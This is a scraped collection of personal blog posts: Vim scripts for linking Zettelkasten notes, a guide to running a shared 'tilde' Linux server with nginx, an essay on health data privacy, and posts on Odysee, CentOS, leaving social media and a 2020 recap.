forgotten by you for sure, but also “forgotten” by the Zettelkasten itself if it lacks links).\nNevertheless, I’m making the transition because I want to commit to the idea of my note collection being dynamic, organic, an entity of its own, rather than it being a static dump.\nIn order to make this transition, you start to fully rely on your tools.\nSince I’m hacking together my own tools some issues came up, in this case with using timestamps in filenames.\nThe O.G. Zettelkasten of Luhmann\n had an extensive naming convention for organizing notes, but it was more of a necessary evil because computers were not in the picture yet.\nGiven that we now have digital means of naming, searching, and linking notes, a strict naming convention for the notes is an unnecessary complication that blindly applies an “analogue” mindset to a digital solution.\nThe authors from Zettelkasten.de are however strong proponents of the more superficial organization of notes by their time of creation, which they do by inserting a unique timestamp at the beginning of the filename.\nFor me, the best argument for this approach is that unique timestamps are a good way of recovering links through potential filename changes.\nThe main reason I did not use them was however that I used Vim’s default filename/path completion (C-x C-f in insert mode) when making Markdown links.\nThis worked fine for me as long as filenames are meaningful, but this just doesn’t cut it anymore when all filenames start with a timestamp, as you would have to manually start typing the timestamp.\nAn early adapter of my Vim experiment, Boris\n, did however use long complex timestamps and noticed interlinking was getting in the way of his workflow.\nSince he now makes all his notes for his PhD in Vim, I certainly do not want to be responsible for trouble!\nSo here it goes …\nCreate a timestamped Markdown note in your Zettelkasten ¶\nBefore we solve the bigger issue, let’s add some convenience.\nWhen using timestamps, manually typing out the date and time is a pain in the ass.\nEach timestamp needs to be a unique identifier, so this means you at least also want to include the time of day, potentially up to the amount of seconds if you regularly make multiple notes within a minute.\nI don’t personally, but the code below is very easy to adjust to your own needs.\nFirst, we declare a variable that holds the location of our Zettelkasten, so we may use it in multiple places without having to retype the whole path.\nlet g:zettelkasten = "/home/edwin/Notes/Zettelkasten/"\nSecond, we want to define our own custom command that 1) pre-fills all the stuff we don’t want to type, namely the timestamp and the extension (I always use markdown), and 2) that prompts you for the name of your note:\ncommand! -nargs=1 NewZettel :execute ":e" zettelkasten . strftime("%Y%m%d%H%M") . "-<args>.md"\nThis will produce a filename like “201704051731-my_awesome_note.md”.\nDon’t bother with understanding this.\nWriting it certainly gave me a headache because I’m new to Vimscript.\nWhat is interesting for you is “%Y%m%d%H%M” because it indicates how you want to format your datetime.\nYou can read about this by typing :help strftime and otherwise this\n is a good resource.\nNow all we have to do is declare a mapping to call our command.\nI use the “n” prefix for all note-related stuff I write myself, so I choose “nz”, which just also happens to be a mnemonic for new zettel.\nnnoremap <leader>nz :NewZettel \nDone!\nNow let’s solve the real problem of effortlessly linking to this note.\nWarning: it gets pretty sexy ahead.\nUsing fuzzy finding (CtrlP) to create formatted Markdown links to files ¶\nThe main issue was that we never want to type timestamps in order to reap the benefits of path completion to get a Markdown link to the file we want.\nNow that we are at it, having to format a Markdown link like [description](link) also takes time, so let’s automatize that as well.\nMy new solution is to rely on my fuzzy file finder to find a file and automatically create a markdown link to it. I use CtrlP with ripgrep, but fzf is also a great choice, see fernando’s comment\n for a fzf solution.\nThis is a great solution because the fuzzy nature of it allows you to ignore the timestamp altogether.\nBut it also allows you to search on a partial fragment of the time and a part of the note title.\nI can imagine you for example remember making a note about Zettelkasten somewhere in 2020, but you don’t quite remember the exact date (unless you are Rain Man) and neither the precise name of the file.\nNo problemo! Boot up CtrlP and search on “2020Zettelkasten”.\nWe can extend CtrlP to then automatically create a markdown link to the matching file, with Ctrl-X.\nHave a look at the short screencast I made\n.\nI started with code provided in this StackExchange post\n and adjusted it to create valid Markdown links:\n" CtrlP function for inserting a markdown link with Ctrl-X\nfunction! CtrlPOpenFunc(action, line)\n   if a:action =~ \'^h$\'    \n      " Get the filename\n      let filename = fnameescape(fnamemodify(a:line, \':t\'))\n\t  let filename_wo_timestamp = fnameescape(fnamemodify(a:line, \':t:s/\\d\\+-//\'))\n\n      " Close CtrlP\n      call ctrlp#exit()\n      call ctrlp#mrufiles#add(filename)\n\n      " Insert the markdown link to the file in the current buffer\n\t  let mdlink = "[ ".filename_wo_timestamp." ]( ".filename." )"\n      put=mdlink\n  else    \n      " Use CtrlP\'s default file opening function\n      call call(\'ctrlp#acceptfile\', [a:action, a:line])\n   endif\nendfunction\n\nlet g:ctrlp_open_func = { \n         \\ \'files\': \'CtrlPOpenFunc\',\n         \\ \'mru files\': \'CtrlPOpenFunc\' \n         \\ }\nI just love it.\nIrregardless of whether I will use timestamps in my filenames, this will greatly speed up interlinking notes in my Zettelkasten.\nEDIT 09/02/2021: a previous version of the post did not escape the + regex modifier, which is necessary in the vim regex dialect. As a result, the timestamp was not correctly removed in the created link descriptions.\nThe screencast below uses the old incorrect version.\nScreencast ¶\n\n    \n\n'] at ['https://www.edwinwenink.xyz/posts/48-vim_fast_creating_and_linking_notes/']

EXCEPT DESCRIPTION FOUND: ['When I’m busy I am usually very motivated to do side projects, but paradoxically I find it harder to stay motivated and productive when I find myself with more time on my hands.\nMy guess is that many people noticed a similar effect during this Corona crisis, thinking something along the lines of “well at least I now have time to do project X that I’ve been meaning to do for a while”, only to find that it’s not that easy to stay motivated after being locked in the house for several days without external structure.\nI felt the vague need to do a project, but more specifically I wanted it to be a project that would be collaborative and social, to make up for the social interaction lost due to Covid-19.\nWell, here’s the perfect project: setting up your own “tilde club” along the lines of tilde.club\n or tilde.town\n (see here\n for my tilde.club account).\nThere’s something in this project for people of different interests and skill sets.\nMy main interest was to gain some experience with setting up a web server and being a system admin of a UNIX-like system.\nFor my non-technical friends, it was a fun project because it provided a safe environment to get to learn the command line and learn how to write web pages.\nAs for the content of those web pages: your own fantasy is the limit.\nOkay fair enough: your skill level is also a limit, but you can make fun wonky webpages with basic html and css.\nHere’s a quick write up of the steps to get you started.\nBoot up a Linux Virtual Machine in the cloud ¶\nOur server is hosted on Google Cloud Platform.\nThey have an “always free” tier for which very specific restrictions apply both for the hardware and the location of the Virtual Machine (it has to be located in a specific part of the US).\nA virtual machine is basically a computer program that emulates a computer system on which you can run a particular operating system as if it were a regular computer as you have it at home.\nIn this quick guide I’m assuming you are running Linux.\nUsually, providers offer readymade VMs with operating systems pre-installed, so you won’t have to do this manually.\nIf you opt for the always free tier, your resources will be limited (580 Mb RAM).\nThat’s okay, in fact, it’s a fun challenge in itself.\nIt makes us think about how we use our shared computer and also introduces (hopefully) some sense of responsibility: you share the computer with other users and if you consume all resources they are left out.\n580 Mb should be more than enough for your friends and for running a lightweight web server for hosting some web pages\nFor the setup instructions you’ll need a user account with root privileges (“administrator rights”, if you’re coming from Windows).\nYou can make one from the start (skip ahead) or just use the web interface that the provider offers.\nCreating a server message of the day (MOTD) ¶\nWhen people login they are greeted with some information about the system and a welcome message.\nYou can customize this welcome screen entirely.\nMaybe come up with a nice logo for your server and display some useful instructions for new users.\nTo edit the message of the day, just edit the /etc/motd file, for example with nano or vim (so vim /etc/motd).\nThis is just a text file and everything you place in there will be printed verbatim to the welcome screen.\nThere are also a number of scripts whose output is displayed.\nYou can list all of them with ls /etc/update-motd.d.\nYou’ll see that there are several scripts sorted by a prependend number.\nThe number in the filename indicates its order of execution.\nFor example, on Ubuntu you will find a script called 10-help-text and another called 50-motd-news and the first will be executed before the latter.\nSo if we then want a custom script to be run, before these scripts, we could create a bash script called 01-custom.\nFor example, on login, I want to show which other users are online:\n#!/bin/sh\n\necho "Who is logged in?\\n"\n\nusers | tr \' \' \\\\n | uniq\nYou can enable or disable some of these scripts by toggling whether they are executable, so there is no need to delete these scripts if you do not want them to run.\nTo disable all scripts in this folder, run sudo chmod -x /etc/update-motd.d/*.\nsudo is to “do” this action with “super user (su)” rights, chmod changes the files permissions, and the * expands to all files in the folder.\nTo then enable your own script, instead run sudo chmod+x /etc/update-motd.d/01-custom.\nCreating user accounts ¶\nNow that we have a welcome message, we should add some users to our system.\nCreating a new user is easy enough, you simple run:\nadduser [name], so for example adduser edwin, and then fill in the details in the prompt.\nHowever, you’ll likely want to have stuff ready for new users on their first login.\nThe adduser command reads a “skeleton” directory called /etc/skel.\nEverything you put in there will be copied to the home folder of the new user.\nIf you want to set your server up like a “tilde” club I can for example publish a website under myurl/~edwin, then it is handy to already provide a public_html folder with a default index.html file.\nYou could also leave some further instructions for new users in a README file and provide some minimal configuration files, for example a .vimrc for Vim.\nThe first user we will make is our own admin account with sudo rights, so we can proceed using that account instead of the root user that the webinterface offers.\nI’m assuming you already made your account with the command from above.\nThen set a password, and add your account to the “sudoers” group.\nCheck all groups with groups to check if indeed there’s a sudo group.\nInterestingly, on Google Cloud Platform the “sudo” group is replaced with a group called “google-sudoers”.\nSet the user’s password: passwd [name].\nAdd the user to the sudo group: usermod -aG sudo edwin.\nGiving users access over ssh ¶\nWe do not have a graphical environment, so users will have to connect with a shell session on our server.\nWe do that with a tool called ssh for secure shell.\nFor setting up ssh as a user, I can refer you to the tilde.club tutorial on ssh\n.\nThe tricky part with ssh is to make sure all file permissions are correct.\nOn the server side, we need to ensure the “ssh daemon” (sshd) is running and that people can connect through the port we specified (22 by default).\nCheck the status of the ssh daemon: systemctl status sshd.\nOpen port 22 for ssh traffic: sudo ufw allow 22 or sudo ufw allow ssh.\nEnable the firewall: sudo ufw enable.\nBefore enabling the ssh daemon to allow incoming ssh connections, we should decide whether to allow people to login with their passwords or only using a ssh key.\nThe latter is the more secure option and is strongly recommended, but requires more effort from users (again, see the tilde.club guide for ssh).\nThe sshd configuration can be found at /etc/ssh/sshd_config.\nGoogle Cloud Platform already created this file for me with sensible defaults.\nIf not, you should read a tutorial on this file because setting it up wrongly is likely to make your system vulnerable.\nAssuming everything else is set up correctly, just choose whether you want to login with passwords or only with keys, by setting PasswordAuthentication to either “yes” or “no”.\nFYI, you can check information about shh login attempts in /var/log/auth.log.\nE.g. run grep ssh /var/log/auth.log | less.\nSetting up a “usedir” web server with nginx ¶\nNow we’ll allow our users to publish everything in their public_html under [yourdomainurl]/~[user]. The “~” is why these type of servers are now called “tilde” communities, and they indicate that you’ve reached a particular userspace on the shared domain.\nYou still see it sometimes for old school sites of academics, see for example this great page on Prof. Dr. Style\n.\nWe’ll use Nginx because it is very lightweight and easy to setup.\nThis guide from DigitalOcean\n is great and straightforward.\nIt also instructs you to set up the firewall ufw correctly, like we did before for ssh.\nAssuming you keep the default settings, you can edit your homepage with:\nvim /var/www/html/index.nginx-debian.html\nThe next thing we want to do is set up nginx to publish web sites “usedir”-style, meaning that we allow each user to publish a website from a public_html folder in their home directory.\nI found here\n how to do that in Nginx.\nOpen the default configuration file at /etc/nginx/sites-available/default and make sure it matches the following:\n# Default server configuration\n#\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        # SSL configuration\n        # listen 443 ssl default_server;\n        # listen [::]:443 ssl default_server;\n\n        root /var/www/html;\n\n        # Add index.php to the list if you are using PHP\n        index index.html index.htm index.nginx-debian.html;\n        server_name example.com www.example.com;\n\n         location ~ ^/~(.+?)(/.*)?$ {\n         alias /home/$1/public_html$2;\n         index index.html index.htm;\n         autoindex on;\n           }\n}\nThese should be default except for the block starting with “location”.\nNow we just start or restart Nginx and everything should work!\nsystemctl restart nginx\nAll users can now make their own website, which will be live immediately.\nSet your personal information to see for other users ¶\nLinux systems have this interestingly named tool called finger that shows you the personal information of other users, as well as their current plans and the project they are working on.\nTo set your own details, “change finger”: chfn.\nAdditionally, you can notify others what you are up to by making a plan at ~/.plan.\nYou can also indicate others of a project you are working on by making ~/.project.\nAll this information will be included when people “finger” you.\nOutput of finger ejw:\nLogin: ejw                              Name: Edwin Wenin\nDirectory: /home/ejw                    Shell: /bin/bash\nOffice: Netherlands\nOn since Wed Feb 26 08:40 (MST) on pts/18 from 145.116.163.127\n   3 seconds idle\nNo mail.\nProject:\nExperimenting with old school Unix stuff\nPlan:\nThink about fun projects to add to my page\nYour ~/.plan file can be arbitrarily long, so this is basically the first blogging tool ever.\nYou could “finger” someone and read their latest “blogpost” there.\nYou can change your shell with chsh.\nSet the correct timezone ¶\nFor example:\ntimedatectl set-timezone Europe/Amsterdam\nCommunicating with others on the server ¶\nNow that people can login, we can try to communicate with other users.\nSee who’s online with who.\nYou can write to all, with wall.\nThis will dump your message on the screen of all logged in users, interrupting their work.\nThis is fun or annoying, depending on who you ask and how often you do this.\nOthers can clear their screen and continue working with Ctrl-l.\nYou can also write to individual users, simple say write [user].\nIt can occur that a user is logged in multiple times, in that case you need to be more specific, for example write edwin pts/0.\nYou can find all that info under who.\nAlso handy to know: you quit writing a message, type Ctrl-D.\nThis does not allow us to write messages to people that are offline.\nFor this however, we can use mail!\nWhen you “finger” yourself, it will say “No mail”.\nLet’s change that.\nSetting up mail can be a hassle, but using mail only locally luckily works out of the box.\nFind out if a mail client is installed:\ndpkg -S /usr/sbin/sendmail\nInstall the postfix MTC ( Mail Transfer Client).\nThis will spawn a prompt asking you how you want to use postfix.\nIndicate you only want to use it locally.\nsudo apt install postfix\nLuckily for us, postfix contains a default config for local use only.\nNow we can send mail between users, great!\nUse the sendmail command to send mail.\nLocal mail arrives in /var/mail/[username]\nNow we need a way to read mail.\nFor this we’ll use mutt.\nInstall mutt: sudo apt install mutt\nThen open your local mailbox with mutt -f /var/mail/[username]\nTry sending yourself an email, and then finger yourself again to see if your “Mail” entry is updated.\nDone!\nIf you want to make your club more social with instant messaging, consider installing an IRC daemon for IRC chat.\nInstalling some fun commands ¶\n\nsl\ntmatrix\ncowsay\nfortune\nfortune-mod\nfiglet\nansiweather\n\nCreating your own commands for your tilde community ¶\nDon’t forget to have some fun making your own stuff for your little community.\nIn my friend group we have this quite random beaver theme going on.\nSo I extended the cowsay command with an ASCII beaver (source\n) and made it spit out random beaver-related quotes:\n ----------------------------------------\n< Save a tree, eat a beaver - Zac Hanson >\n ----------------------------------------\n     \\       .---.\n      \\     @ @   )   \n       \\    ^     |\n            [|]    | ##\n           /      |####\n          (       |####      \n           | /   |#BP#\n          / |.\'   |### \n         _ ``   )##\n        /,,_/,,____#\n\nIf you place this command in /usr/local/bin and make it executable, other people can also use it.\nBecause all users are on the same machine, you can really create some community based content.\nFor example, I asked my friends to put a ~/.digest file in their home directory where they can give a daily tip for music, culture etc.\nThen I made a script that reads those files and compiles them into a webpage with all daily tips.\nFun aside, your little community could probably use some handy scripts.\nAnother script I enjoyed making was one that finds the most recently updated web pages from all public_html directories. I then make a webpage out of those as well, so it’s easy to keep track of what others are doing.\nThis might be one of the most convoluted oneliners I ever wrote, but it works:\nfind /home/ -path "*public_html*html" -type f -ls -printf "%T@ %p" | sort -k 1nr | head -n 15 | cut -d " " -f 2 | sed "s/\\/home\\///" | sed "s/\\/public_html//"\nYou can automate the running of such a script using crontab -e.\nBy the way, once you have scheduled your script for timed repetition using cron, it just happens to be that the cron daemon sends you mail on the mail you have just configured!\nConclusion ¶\nIf you follow these steps and play around with them, you’ve created your own little corner of the internet.\nI’d like to think that’s also a small form of resistance against the modern internet dominated by tech giants, bots and ads.\nBesides, sometimes old and simple technology is just the coolest.\n'] at ['https://www.edwinwenink.xyz/posts/47-tilde_server/']

EXCEPT DESCRIPTION FOUND: ['Published in Turning Magazine\n, AI & Health edition, February.\n\nArtificial Intelligence (AI) promises great benefits for health care.1\nThe use of machine learning techniques can speed up diagnoses, in some cases increase their accuracy, and ideally would play a role in prevention.\nBut these promising techniques can challenge our privacy because they require large amounts of sensitive patient data to be gathered and analyzed.\nAdditionally, we can expect a surge in tech companies taking interest in the health sector because hospitals themselves are not likely to have the infrastructure and expertise for handling big data.\nBut if the modern-day equivalent of sapientia est potentia (“knowledge is power”) is data est potentia, then we should think through how much power we want to give to the tech giants.\nIf health research is included in the ongoing “datafication” of the world, are we moving towards a situation where academic hospitals need to buy expensive licenses from Google or Microsoft to access large databases for health research?\nAnd to what extent do we want tech companies with flexible morals to be in control of our health data?\n\nImagine that you overhear someone talking about “Project Nightingale.”\nYou might think this is a reference to a new James Bond movie or some CIA operation, but it is not.\nIt is a medical data sharing project of Google and Ascension, which is the second-largest healthcare provider in the U.S. that manages 2600 healthcare locations, including 150 hospitals2.\nSomewhere in 2018 Google and Ascension made a deal without consulting doctors and patients or providing them an opt-out, that implies that the electronic health records of up to 50 million patients will be transferred to Google, making them available for the development of AI applications3.\nLast month (November 2019) a whistleblower working on Project Nightingale reported concerns that this immense data transfer - the biggest in health care so far - might be in breach with the relevant rules on data privacy (HIPAA)4, which has spawned extensive media coverage567 and a federal inquiry.8\nThe transferred records are reported to include names, addresses, family relations, allergies, radiology scans, medication use and medical conditions.\nA lack of appropriate anonymization leads to the fear that Google employees working on the project might look into these files.\nA previous data transfer between Google’s DeepMind and the Royal Free hospital in 2017 had been criticised for having an inappropriate legal basis for another reason9.\nThe UK’s national data guardian pointed out that the deal was justified as directly benefiting patient care, whereas instead it seemed to be primarily used for testing DeepMind’s “Health Streams” app.10\nHelen Nissenbaum’s concept of “contextual integrity” is useful for understanding privacy concerns about these developments.11\nConsider how we disclose personal and confidential information to a doctor so that the doctor can adequately take care of us.\nEven though confidential information is shared and you give away some control over your data - the doctor perhaps has to get a second opinion from a colleague - you would almost certainly not think of this as a privacy intrusion.\nBut there is an intrusion if your doctor shares that same information with your employer.\nIn other words, the norm for what is an appropriate flow of information heavily depends on the context and cannot simply be extrapolated.\nEspecially AI students should know about relevant notions of data privacy because there is a good chance they will be confronted with personal data in their future jobs.\nWe have to realize that alongside AI’s promises for the benefit of society, AI techniques can also be used to track our behavior and build personal profiles, for example for undesirable surveillance or political microtargeting1213.\nContextual integrity is upheld in the European General Data Protection Regulation (GDPR) through a purpose limitation principle: personal data can only be collected for a legitimate purpose that is stated in advance and cannot be further processed for other purposes (cf. GDPR art 5(1)(b))1415.\nThe ethical concerns about Project Nightingale are thus not only about confidentiality, but also about whether patient consent can validly be extended to the use of data for future machine learning applications.\nDoctors connected to the Ascension network surely did not explain to their patients: “Anything you say can and will be used (against you?) by Google. You have the right to remain silent.”\nPhilosopher Tamar Sharon coined the push of tech companies into the health sector the “Googlization of health research”16.\nThis catchy phrase expresses how tech companies are reshaping health research through crowdsourcing data collection, for example by delegating it to the users who gladly track their own health with running apps and smart watches.\nApple facilitates medical research by using the iPhone and Apple Watch.\nThis month Google announced they will be buying FitBit for 2.1 billion dollars17.\nThis is a clever move.\nWhereas Google’s storing of traditional health data from hospitals is under huge scrutiny, we don’t see riots over Google buying FitBit and potentially using it to track your health.\nThis type of technology could allow a form of liquid surveillance that we would find disconcerting if performed by a centralized authority.\nWe can avoid paternalism by noting that consumers may share personal data to get some utility in return as long as they are aware of this trade-off.\nThey can read the terms and conditions and decide to opt out.\nBut one should at least realize that most people either have no time to read all conditions, do not understand their legal language, or otherwise feel pressured into accepting them because they need the service.\nIs this type of consent really informed and explicit?\nIn particular people with health problems are more easily nudged into sharing health data.\nConsequently, the idea of a voluntary trade-off might be a fallacy 18.\nAs Sharon points out, this makes the use of apps to gather sensitive health data “morally dubious” (p.5).\nSharon points out an additional dynamic specific to apps that collect or require health data, namely that they almost without exception promote their service as altruistic: if we all crowdsource our health data for research we can solve nasty diseases together.\nThe cynical but fair point Sharon makes is that people are most willing to share their sensitive data “when altruistic modes of behavior and financial profit-seeking overlap; and this in ways that are often not transparent.” (p.6).\nTech companies know how to utilize this psychological mechanism.[*]\nConsequently, Morozov argues that when we really care about privacy we should not just come up with stricter privacy laws, but should also offer a robust intellectual critique to battle and limit the “information consumerism” by which consumers sell out for free apps and material benefits19.\nConsumers should realize they are still paying but with a new currency: their personal data.\nConsider the Dutch “a.s.r. Vitality program” that offers up to 8% cashback on health insurances if you show you move enough with a FitBit20.\nMassive use of similar applications will lead to a normalization of self-tracking, to the point where not participating provides you with serious social and financial disadvantages.\nConsider an analogy: cashless payment is handy for consumers, but its normalization leads to more services refusing cash and thus forcing us to pay cashless if we need that service.\nSuch a normalization would leave those that are aware that they pay with their privacy behind with a sense of resignation that the battle over personal data has already been lost.\nNext to laws protecting against personal data being used without consent, we thus need intellectual activism about the “Googlization” of health research to show people what they are selling before we have lost control over our health data.\n[*] This paragraph is edited in the printed version in a way that I do not fully approve of\n\n\n\n\nSee for example https://www.aidence.com/blogs/early-lung-cancer-detection-with-ai-a-guide-for-patients/ ↩︎\n\n\nhttps://ascension.org/about ↩︎\n\n\nhttps://www.theguardian.com/technology/2019/nov/12/google-medical-data-project-nightingale-secret-transfer-us-health-information ↩︎\n\n\nhttps://www.dhcs.ca.gov/formsandpubs/laws/hipaa/Pages/1.00WhatisHIPAA.aspx ↩︎\n\n\nhttps://www.wsj.com/articles/google-s-secret-project-nightingale-gathers-personal-health-data-on-millions-of-americans-11573496790 ↩︎\n\n\nhttps://www.nytimes.com/2019/11/11/business/google-ascension-health-data.html ↩︎\n\n\nhttps://www.nationalreview.com/news/google-gathering-health-care-data-on-millions-of-americans-with-secret-project-nightingale/ ↩︎\n\n\nhttps://edition.cnn.com/2019/11/12/tech/google-project-nightingale-federal-inquiry/index.html ↩︎\n\n\nhttps://www.theguardian.com/technology/2017/may/16/google-deepmind-16m-patient-record-deal-inappropriate-data-guardian-royal-free ↩︎\n\n\nhttps://www.youtube.com/watch?v=ik9ps7L-p2E ↩︎\n\n\nNissenbaum, Helen.

EXCEPT DESCRIPTION FOUND: ['In the past couple of months I\'ve been getting a bit sceptical of the content and practices on YouTube, and while I use Invidious or MPV to watch anything on there that\'s still supporting the content there. YouTube/Google have been allowing weird, gross, or obvious propaganda to be on the trending page or in the recommended and while I don\'t see it often there\'s the odd chance that I see the thumbnails when landing on an Invidious instance. While this "content" gets pushed other good content such as small tech channels I follow often don\'t even show up when searching, a good example has been the content from Protesilaos Stavrou who makes videos on emacs, this content often has been hidden on my RSS feed for YouTube channels while a channel like Linus Tech Tips never misses a beat when it comes to RSS or search, obviously that\'s due to monitization and who gets more views which is a real shame.\nI\'ve opted now to start using Odysee/LBRY. Why\'s that? It\'s backed by crypto, I can watch videos and support the content I like by donating directly, moreso I don\'t have to worry about videos I like being taken down and channels being demonitized. I\'ll start by releasing my content on Odysee and getting my videos caught up on there and once caught up I\'ll start putting out exclusives.\nI\'m not sure how long YouTube will go until another adpocolype or something like Twitch\'s Off-Service Investigations taking place on their platform - which not inherently bad that they want bad actors off their platform it\'s more so of what they consider bad or what else they decide to do with that information they get on you. I enjoy supporting small creators and LBRY/Odysee allows me to do so directly and help support a platform that can really make a difference. Other reasons you may want to support a platform like this would be to help the fight on Crypto, ie SEC vs LBRY.\nNotes\nTo clarify some things that maybe weren\'t clear upon first glance at the sites; LBRY is the protocol/crypto and Odysee is the video sharing platform a la Youtube.\nYou can access Odysee videos via MPV, for example: $ mpv https://odysee.com/@MaterialFuture:d/Sin-Full-Album:c or by opening mpv and dragging the video links from your browser into the mpv window.\n\n\nResources\n\nJoin Odysee\nMy Odysee Channel\nWhat Is LBRY\nOdysee\nSEC vs LBRY\n\n\n\nCreators I Like On Odysee\n\nU M A M I\nMentalOutlaw\nHomesteadonomics\nCS Homegrown and Healthy\nMinutePhysics\n\n\n\nKnow any other channels? Let me know and I\'ll add them here or make a page that lists all my favorite creators.\nIf you want to give Odysee a try and make an account then use my link so we both get LBC for joining: https://odysee.com/$/invite/@MaterialFuture:d\nRemember to give me and others a follow, help grow this platform, and help smaller creators find a place to thrive. Also, encourage creators on YouTube to move over to Odysee (or other platforms)!\n'] at ['https://materialfuture.net/posts/blog/2021-4-14-odysee-lbry/']

EXCEPT DESCRIPTION FOUND: ['This is just a quick update as I realize I dind\'t post anything for Febuary as was AFK for most of the month on nearly everything.\nMusic\nI\'ve been primarily working on music these past couple of months and will be continuing to ramp up my production time and efforts as I get closer to completing these releases. The album art, inserts, and promotional material is getting closer to being complete as well and as a release date is worked out I will start releasing that promo stuff on YouTube and other platforms to promote my work.\nAnother interesting note about my music that I had discussed but may not planned for was for people to use my music for streaming. In the coming month I will be reaching out to content creators I know personally that stream or make videos and essentially give them early access to upcoming music to use. With that I will be uploading my music to all streaming platforms and giving them links to that as well to use.\nPhysical releases have been priced out to create a run of my latest album and of my older works that I think deserve that treatment and selling those on BandCamp and another platform soon to be announced. I want to also say that I\'m working on designing a \'special edition\' of sorts that will use mostly recycled materials and contain things like more inserts, stickers, cassette version, and some small promo material.\nAs I\'m in the process of moving yet again progress will be slow again in March giving myself time setting up my studio once again as my hope is to create an evironment to create great art.\nSoftware\nI haven\'t been working on software as much as had before because it\'s not my priority, but once I get to a good place with my music I\'m going to be working on tools I\'ve been tinkering with occasionally. If you\'re interested in that follow my GitHub for more info.\nVideos\nI\'ve slowed down on video content for the time being and will be focusing on releasing the last bit of music I have saved up over the next month in video form. Releasing videos on YouTube allows people to access it many different ways and in some cases can be easier for people.\nMy plan for 2021 is to release actual filmed music videos for the new songs being produced and other fun stuff.\n'] at ['https://materialfuture.net/posts/blog/2021-3-02-general-updates/']

EXCEPT DESCRIPTION FOUND: ['Intro\nI\'ve recently been keeping up with the news regarding CentOS and CentOS Stream and while being very disappointed by the news that CentOS Stream will take away from the stability of LTS by turning it into a rolling release distro - which coming from arch-based distros you would think I would like something like this.\nI\'ve come to realize that when a company such as RedHat (IBM) makes a change to it\'s latest products that it trickles down and affects the legacy products, for example: a company that relies on an older version of CentOS and don\'t have the resources right away to might grate to the latest version are left in the dust, and in this case older versions of CentOS cannot be updated because RedHat (IBM) took down the servers and mirrors that yum depends on, now you\'ll manually compile and manage your software/binaries. What\'s even more concerning is that this could impact people that rely on having an LTS distro because there is now a countdown to how long they will support the latest CentOS before it can no longer be supported and you\'ll be forced to move to Stream.\nIt\'s important to pay attention to things like this even if you\'re not a dev because it showcases how little large companies care about Open-Source or community efforts and why Linux distros should be worked on mostly as community projects funded by companies that support/use the them and "Enterprise"-Level Linux distros can be kept separate.\nGood News\nRocky Linux is the hope that RHEL people need for future stability in applications and services. Gregory Kurtzer, the founder of CentOS is spearheading the project and is allowing people to contribute to this so it\'s actually a community effort, unlike how RedHat (IBM) pretends to give the community a voice with CentOS. I\'d highly recommend reading more on the website about it as it\'s very interested and really great that Open-Source LTS RHEL won\'t be something left in the dust.\nOther Thoughts\nI hope that Rocky Linux takes off as it\'s an interesting project with passionate people behind it. As for myself, I\'ll most likely be moving towards Debian-based systems for larger server projects and for smaller ones maybe Gentoo or Arch :^)\nResources\n\nRIP CentOS\nRocky Linux\n\n'] at ['https://materialfuture.net/posts/servers/centos-rehl-talk/']

EXCEPT DESCRIPTION FOUND: ['Intro\nI\'m moving away from all things social media, this means Mastodon as well. While I haven\'t actively used such apps as Facebook, Twitter, Instagram, etc in years I realized a few things that bothered me and more so things that I wish to change overall. This doesn\'t include things like IRC or Matrix servers I may be a part of, I\'ll elaborate on that later in this post as well.\nPrivacy\nOne thing that I was made aware of during Christmas is that my family have not only been taking my picture without my consent but also posting said pictures to their social media profiles and allowing people who don\'t have me added to essentially "keep tabs" on me so to speak. Regardless of what you think about privacy it makes me uncomfortable and expect people to show me the same courtesy as I do for them in regards to sharing information, or in this case taking pictures they don\'t consent to.\nInstead of going on and on about what these platforms do with your data I\'ll just provide links at the end of the post\nMeaningful Interactions\nI realize that people tend to still contact me through these old social media accounts and I don\'t think they care that I haven\'t logged on in years or that they could just give me a call. That being said, I\'m trying to make more meaningful interactions in my life, meaning that if I want to let someone know that I care I let them know with a phone conversation or seeing them in person (covid precautions and all) and talking to them.\nI consider human interaction important, therefore I make an effort in creating positive experiences with people face-to-face and not wasting time on my phone - that of which I rarely have on me unless work requires or I\'m expecting a call. I don\'t expect others in my life to follow the same anti-tech/anti-antisocial sentiment as myself but I hope they at least see that you don\'t need to be connected 24/7 to the internet and be so heavily dependent on technology.\nOffline Alternatives\nOffline alternative for updates and communication with people would be, Email, RSS Feeds, and Calling or Texting People, the same as people did years ago.\nWhat I\'ll Be Doing?\nI\'ve gone ahead and deleted all social media other than Mastodon that isn\'t attached to my company and doing a dopamine purge (sort of) by getting all my content via RSS much like I was earlier in 2020. It wasn\'t that I was using social media at all, but rather I see myself still being burdened by it just existing and want to purge all these unnecessary things from my life.\nI will be following people I enjoy via RSS and if I want to talk to people I will make a better attempt to reach out and talk either via email or whatever method is appropriate.\nI will continue to post on my blog for updates to all I\'m working on as well as updates to anything else I wish to share.\nI find that I\'m happier when I don\'t hear notifications go off and don\'t have the anxiety from having to worry about what others think.\nWhat Should You Do?\nDo whatever sparks joy in your life and remove the things that don\'t. Don\'t let others make you feel like your happiness, security, and well-being are invalid.\nResources\n\nDeleteFacebook\nAttention restoration theory\nGuide On Discourse\n\nLinks\n\nMy Contact Me Page\nWhat Is RSS?\nMy RSS Feed\n\n'] at ['https://materialfuture.net/posts/blog/activitypub-migration/']

EXCEPT DESCRIPTION FOUND: ['Intro\nThis past year has been a wild one to say the least but I can say that this was a definitely year of growth and learning for me, so in this post I\'ll go over what all I worked on and learned throughout the year to better emphasize what all happened.\nFor a bit of backstory on the where my year started, I had just quit my job in February due to some family situations and shortly after had to sell my house and move cities, then of course Covid-19 affected pretty much everything in the US.\nLearning\nI had a lot free time after leaving my job and took the opportunity to download and purchase some programming and system administration books to better teach myself the things I wanted to learn in 2019.\nSo from that I learned and took self-taught courses in these subjects;\n\nC\nC++\nRuby\nLaTeX\nHaskell\nOrg-Mode\nEmacs 27 + Elisp\nCommon Lisp (SBCL)\nObject Oriented and Functional Programming\nGuix GNU Distribution + Guix Package Manager + Guile\nLinux System Administration - RHEL + Debian-based systems\n\nYou can read more on what books I read in this post regarding my 2020 Completed Books.\nSome other notable things that I learned about this year were;\n\nIPFS - File-sharing and hosting protocol\nGemini - Protocol much like gopher but better\n\n\nCreating\nIn 2020 I started a couple of projects that either I stopped due to hitting a brick wall or stopped due to lack of motivation (unfortunately). So here\'s a couple of the project I worked on in 2020;\nBash Projects\nEntryDescription\nCovid DataA bash script that provides data on Covid-19 in the command-line.\nMARBSLARBS fork focused on Emacs\n\nCrystal Lang Projects\nEntryDescription\nCycling DataA command-line application that consumes and parses cycling data.\nCrISBNCrystal Library for handling ISBNs and 